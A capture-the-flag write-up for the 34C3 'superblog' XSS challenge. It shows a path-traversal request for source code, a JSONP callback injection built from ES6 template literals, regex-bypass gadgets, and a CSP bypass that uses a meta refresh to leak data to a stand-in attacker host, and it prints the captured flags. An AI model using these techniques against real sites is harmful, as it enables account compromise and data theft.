This is a classic XSS challenge. You can signup, login, publish your post, feed your post and contact admin to let him visit your post.

Flag will show when admin access /flag1 and /flag2, the different between this is that flag2 need calculate the captcha and submit a form to get flag.

This site use strict CSP as below

```
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: no-sniff
Content-Security-Policy: default-src 'none'; base-uri 'none'; frame-ancestors 'none'; connect-src 'self'; img-src 'self'; style-src 'self' https://fonts.googleapis.com/; font-src 'self' https://fonts.gstatic.com/s/materialicons/; form-action 'self'; script-src 'self';
Vary: Cookie
X-Frame-Options: DENY
Referrer-Policy: no-referrer
```

At first, we can get the source code by visit ``http://35.197.245.102/static../views.py``, and we can notice that there has an callback in feed with following code:

```python
@require_safe
def feed(req):
    posts = get_user_posts(req.user)
    posts_json = json.dumps([
        dict(author=p.author.username, title=p.title, content=p.content)
        for p in posts])
    type_ = req.GET.get('type')
    if type_ == 'json':
        resp = HttpResponse(posts_json)
        resp['Content-Type'] = 'application/json; charset=utf-8'
    elif type_ == 'jsonp':
        callback = req.GET.get('cb')
        bad = r'''[\]\\()\s"'\-*/%<>~|&^!?:;=*%0-9[]+'''
        if not callback.strip() or re.search(bad, callback):
            raise PermissionDenied
        resp = HttpResponse('%s(%s)' % (callback, posts_json))
        resp['Content-Type'] = 'text/javascript; charset=utf-8'
    return resp
``` 

Apart from this, even you don't get source code, because this site set ``DEBUG=True``, you can also get this code by visit ``http://35.197.245.102/feed`` which will trigger an UnboundLocalError.

Notice with that regexp, we can still use ``\`{}+``, so maybe use ES6 template is a good idea.

Therefore, we can execute some javascript code by cb, for example, ``<script src="/feed?type=jsonp&cb=alert`1`"></script>``.

Another challenge is how to bypass CSP, after try many times, we found ``<meta http-equiv="refresh" content="0;url='http://you.xss.com'`` can bypass.

So our idea is get flag by js code, and use csp bypass to navigate to our site. Complete exploit is [here](https://github.com/LyleMi/CTF/blob/master/2017/34C3/superblog/blog1.py). With this script, we can get flag:

```
,Here is your flag:    34C3_so_y0u_w3nt_4nd_learned_SOME_javascript_g00d_f0r_y0u,
```

In flag2, we need more techniques because here need post an form. So we can use ``Number.call`${atob`%s`}` `` and ``${String.fromCharCode.call`%s`}`` to bypass regexp's limition.

Complete exploit is [here](https://github.com/LyleMi/CTF/blob/master/2017/34C3/superblog/blog2.py). With this script, we can get flag:

```
/,34C3_h3ncef0rth_peopl3_sh4ll_refer_t0_y0u_only_4s_th3_ES6+DOM_guru,
```

Learn from [niklasb's gist](https://gist.github.com/niklasb/b831c726ffc4ee0a97ae2c66bb4e1169), thanks a lot.